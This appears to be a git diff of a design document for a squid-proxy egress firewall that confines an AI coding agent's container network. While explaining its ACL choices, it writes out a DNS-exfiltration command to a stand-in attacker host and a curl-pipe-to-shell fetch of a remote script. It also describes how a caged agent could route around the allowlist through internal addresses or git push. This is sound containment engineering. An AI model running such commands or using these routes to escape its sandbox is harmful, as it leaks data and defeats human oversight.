@@ -4,12 +4,15 @@ covers:                # source paths update-design reconciles this file against
   - compose.yaml
   - firewall/squid.conf
   - firewall/allowed-domains.txt
-reconciled-at: 362dbe2adb9e5c04ce100efc40f7b6a0f8ec50de
+  - toolkit/container.nu
+reconciled-at: 6dd20b1779e5df6bb4a2f60d02c1aa7674d2389d
 ---
 
 # firewall — human-managed egress for the Debian image
 
 **Runtime, not build.** This is the only subsystem that is not reached from a `bootstrap.nu` step: it wraps the finished image from outside. [`../compose.yaml`](../compose.yaml) puts the agent on a network with no way out except a squid proxy, and [`../firewall/`](../firewall/) holds the policy that proxy enforces. It applies to the **Debian rootless** run path only (see [`build.md`](build.md)); the `sbx` path gets its own allowlist from `network.allowedDomains` in [`../sbx-kit/spec.yaml`](../sbx-kit/spec.yaml).
+
+That path has two runtimes and therefore two assemblers. Under docker, `compose.yaml` declares the whole thing. Apple `container` has no compose, so [`../toolkit/container.nu`](../toolkit/container.nu) assembles the same three pieces by hand — caged network, dual-homed squid, agent on the caged side only — from the same policy directory and the same digest-pinned image (`toolkit check` guards the two pins against each other; see [`toolkit.md`](toolkit.md)). Everything below holds for both unless it names one.
 
 ## Why it is not in the image
 
@@ -25,7 +28,17 @@ The obvious alternative — rules inside the agent container — needs `CAP_NET_
 
 The directory is mounted whole, not the two files individually: a bind-mounted *file* pins an inode, so an editor that saves atomically (write temp + rename) leaves squid reading the old copy while the human's edit silently never applies. An in-place append would be picked up, so the failure mode is inconsistent — and it favours the attacker.
 
-The workspace default is a named volume rather than a host path, because Docker creates a missing bind-mount source as root and the unprivileged agent then cannot write its own workspace.
+The workspace default is a named volume rather than a host path, because Docker creates a missing bind-mount source as root and the unprivileged agent then cannot write its own workspace. `WORKSPACE_DIR` is set by hand to the same mount path: `sbx` injects it, compose has to, and without it `cozy sandbox-state` and `cozy dev-link` hard-error with nothing to fall back on.
+
+## Why a missing policy stops everything
+
+Three separate defaults all fail the same way — the proxy comes up healthy-looking with no policy, the agent comes up fine, and the human sees a working stack with mysteriously dead network. Each is turned into a loud, named failure instead:
+
+- The policy mount uses the long form with `create_host_path: false`. The short `src:dst:ro` form lets Docker invent the missing source as an empty root-owned directory, and squid then finds no `squid.conf`. Refusing to create it turns a forgotten `cp -r firewall ~/.config/cozy/firewall` into an error naming the path. `toolkit/container.nu` already errored on this; the two run paths now agree.
+- A `test -f /etc/squid/policy/squid.conf` healthcheck, because the directory can exist and still be empty or half-copied — which the mount cannot catch. The agent's `depends_on` uses `condition: service_healthy`, not the bare list form: that one waits only for "started", so a proxy that started and instantly died still let the agent up.
+- **No restart policy**, on purpose. `unless-stopped` was here, and the failure this proxy actually has is a missing or unparseable policy, which no restart heals — it looped and hid the cause behind a container that was always about to be up. Now it exits once and `docker compose logs egress` says why. A proxy that stays down also fails closed: the agent keeps its route to nowhere.
+
+The proxy image is pinned by **digest with no tag** — with both, the tag is ignored and reads as a lie (this carried `:latest` while frozen). It holds the policy and is the one container with internet, so it must not change under a `pull`. Frozen also means upstream CVE fixes never arrive; re-pin deliberately.
 
 ## Why no CA and no TLS interception
 
@@ -38,6 +51,7 @@ Squid refuses the `CONNECT` **before** the handshake starts, so a blocked reques
 - **`Safe_ports`** — `http_access allow allowed_domains` carries no port constraint on its own. Only `CONNECT` was limited to 443, so a plain request to `http://github.com:22/` made squid open GitHub's SSH port and relay attacker-chosen bytes to it. Stock ships these ACLs for exactly this reason.
 - **`internal_dst`** — the proxy can reach what the caged container cannot (the Docker bridge gateway, other compose networks, its own loopback). Without a `dst` rule the allowlist is a name filter the agent steps around by asking the proxy to fetch an internal address for it. `dstdomain` never matches a bare IP so `deny all` already caught most of it; this makes the intent explicit and covers names that resolve inward.
 - **`dstdomain`, not regex** — it matches the host label-wise, so `api.anthropic.com.evil.example` cannot match an entry. That is why the list is domains.
+- **`deny !allowed_domains` comes before `deny internal_dst`**, and the order is the point, not style. `internal_dst` is a `dst` ACL, so squid must resolve the hostname before it can decide — and it was doing that for names it was about to refuse anyway, which made the proxy a DNS exfiltration channel: `curl -x $proxy http://<data>.attacker.example/` got the refusal logged and the lookup sent. `dstdomain` is a pure string match with no lookup, so denying the non-allowlisted name first means a blocked name never leaves the container at all — which is what "a blocked request never leaves the client" promises. The `internal_dst` rule is then reached only for hosts already on the list, whose resolve was going to happen anyway.
 - **`pinger_enable off`** — the helper needs `CAP_NET_RAW` for ICMP and logs a repeating FATAL without it, while only measuring RTT to pick between peers that do not exist here. The log should show policy decisions and nothing else.
 - **`access_log stdio:/var/log/squid/access.log`**, not `/dev/stdout` — squid drops to user `proxy`, which cannot open `/dev/stdout`, and dies at startup. The image's entrypoint already tails that path to stdout, so `docker compose logs -f egress` still shows refusals — which the human managing the list needs.
 
@@ -45,7 +59,9 @@ Squid refuses the `CONNECT` **before** the handshake starts, so a blocked reques
 
 [`../firewall/allowed-domains.txt`](../firewall/allowed-domains.txt) bounds **which hosts** the agent can reach, and nothing beyond that. It is not a code filter: squid sees only the hostname in the `CONNECT`, never the path or the body, so an allowed host that lets anyone publish carries anything through — `curl raw.githubusercontent.com/attacker/x/main/evil.sh | sh` passes the list cleanly, and `github.com`, the `githubusercontent` hosts and `ghcr.io` are all open publishing platforms. Filtering by content would need TLS interception, which is exactly what this refuses to do (see above); host-only filtering is the price of that refusal, not an oversight. It is not containment either: `github.com` carries `git push`, so with any credential in the workspace it is a full outbound channel. A much smaller list would be needed if the goal were keeping data in.
 
-The entries were not guessed — each was confirmed by running the real tool inside the cage. Three groups: the Anthropic API plus the two hosts `claude install`/`claude update` fetch from (bootstrap Step 9 fails inside the cage without them); git/gh/clone hosts, including `release-assets.githubusercontent.com`, without which `ensure-nu.sh` cannot fall back to the pinned nushell — the one recovery path when latest `nu` can't load `bootstrap.nu`; and the three-host Homebrew bottle chain, droppable if the image's toolset is enough. Claude Code's telemetry host is deliberately absent and nothing breaks.
+The entries were not guessed — each was confirmed by running the real tool inside the cage. Four groups. **Claude Code**: the API, the two hosts `claude install`/`claude update` fetch from (bootstrap Step 9 fails inside the cage without them), and the docs/console hosts `cozy docs claude` mirrors; its telemetry host is deliberately absent and nothing breaks. **git over https**: the clone hosts, plus `release-assets.githubusercontent.com`, without which `ensure-nu.sh` cannot fall back to the pinned nushell — the one recovery path when latest `nu` can't load `bootstrap.nu` — `objects` as the other host that redirect has historically landed on, and `github-cloud` where git-lfs objects actually live. **Rust**: rustup's installer, the toolchain and the crates registry, so a `cozy install nushell|zellij|polars` doesn't clone successfully and then die on crates.io — the worst-shaped failure. **Homebrew**: the three-host bottle chain (formula index → registry token + manifest → blob). The last two groups are droppable if the image's toolset is enough. Each entry carries its own caller in a comment; `api.github.com`'s sole one is nu-goodies' nightly-release check, since `git clone` does not use it and `gh` is not installed here.
+
+Editing the list is a restart, not a rebuild: `docker compose restart egress`, or `nu toolkit/container.nu reload-egress <name>` on Apple `container`. Watch what gets refused with `docker compose logs -f egress`.
 
 ## Limits accepted, not fixed
 
